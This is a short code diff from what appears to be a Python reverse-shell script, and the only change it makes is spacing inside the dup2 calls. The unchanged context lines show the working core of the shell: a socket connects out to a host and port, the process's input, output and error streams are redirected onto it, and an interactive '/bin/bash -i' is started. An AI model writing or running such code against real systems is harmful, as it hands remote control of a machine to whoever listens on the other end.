@@ -43,9 +43,9 @@ if __name__ == "__main__":
     socket_sock.connect((reverse_connection.target_address, 
                             reverse_connection.target_port)) # start a connection to the target
 
-    dup2(socket_sock.fileno(),0) # return stream integer file descriptor
-    dup2(socket_sock.fileno(),1) # used for request I/O actions from the OS
-    dup2(socket_sock.fileno(),2)
+    dup2(socket_sock.fileno(), 0) # return stream integer file descriptor
+    dup2(socket_sock.fileno(), 1) # used for request I/O actions from the OS
+    dup2(socket_sock.fileno(), 2)
     
     # if you have any issues, try: comment line 51 out and uncommend line 52
     run(["/bin/bash", "-i"]) # finally run the bash console
